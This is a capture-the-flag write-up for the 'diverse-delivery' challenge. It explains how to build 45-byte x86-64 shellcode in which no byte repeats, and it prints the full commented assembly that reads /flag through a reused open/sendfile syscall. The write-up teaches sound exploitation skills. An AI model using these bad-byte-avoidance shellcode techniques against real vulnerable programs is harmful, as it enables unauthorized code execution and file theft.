**Challenge Overview**
The objective of this challenge (`diverse-delivery`) is to write and execute shellcode to read the flag, but every byte in your input must be unique.

**Analysis**
To achieve a 100% unique-byte payload, we implemented an open -> sendfile chain using the following workarounds:

1. The syscall Bottleneck (Control Flow Reuse)
Since 0f and 05 can only appear once in the entire payload, we cannot write multiple syscall instructions.

Solution: We write syscall once and place a conditional jump immediately after it. After the open syscall, the file descriptor (usually 3) is returned in rax. We check this with cmp al, 3 and jump to our sendfile setup block, which eventually jumps back to the exact same syscall instruction.

2. Crafting the /flag String (Zero-Byte Avoidance)
Loading /flag\0 directly into a register generates 00 bytes. Filling it with //flag generates duplicate 2f (/) bytes.

Solution: We load the hex representation of fla/ (0x616c662f) into the 32-bit eax register. In x86-64, writing to a 32-bit register automatically zeroes out the upper 32 bits of the 64-bit register.

When we push rax, the stack perfectly contains /fla\0\0\0\0. We then inject the missing g (0x67) directly into the stack at [rsp+4] to complete the string /flag\0.

3. Register Zeroing & Small Integers
Standard zeroing like xor rax, rax (48 31 c0) or xor rdi, rdi (48 31 ff) causes REX prefix (48) and opcode (31) collisions.

Solution: We mix and match 32-bit operations to clear registers without repeating bytes: xor esi, esi (33 f6) and sub edx, edx (29 d2).

To assign small numbers like 2 (for SYS_open), we use push 2; pop rax.

For SYS_sendfile, we heavily utilized xchg eax, esi (a single 96 byte) which brilliantly moves the opened fd (3) into esi while simultaneously zeroing out eax for the upcoming syscall number assignment.

**The Exploit**

Here is the heavily commented, 45-byte unique shellcode:

```
; --- Phase 1: Open("/flag", O_RDONLY) ---
    mov eax, 0x616c662f  ; EAX = "fla/" (clears upper 32-bits to zero)
    push rax             ; Stack now holds: "/fla\0\0\0\0"
    mov byte ptr [rsp+4], 0x67 ; Inject 'g'. Stack is now: "/flag\0\0\0"
    
    push rsp             ; Push pointer to the string
    pop rdi              ; RDI = path ("/flag")
    
    xor esi, esi         ; RSI = 0 (O_RDONLY)
    sub edx, edx         ; RDX = 0 (Mode)
    
    push 2               ; SYS_open
    pop rax              

; --- Phase 2: Syscall Loop & Padding ---
do_sys:
    syscall              ; 1st pass: open(), 2nd pass: sendfile()
    cmp al, 3            ; Did open() return fd 3?
    je sys2              ; If yes, jump to sendfile setup           

; --- Phase 3: Sendfile(1, 3, 0, BIG_NUM) ---
sys2:
    xchg eax, esi        ; swap: ESI = 3 (in_fd), EAX = 0
    lea edi, [rax+1]     ; EDI = 1 (out_fd = stdout)
    mov r10, rsp         ; R10 = Huge number (count = stack pointer)
    mov al, 40           ; RAX = 40 (SYS_sendfile)
    jmp do_sys           ; Jump back to the single 'syscall' instruction
```
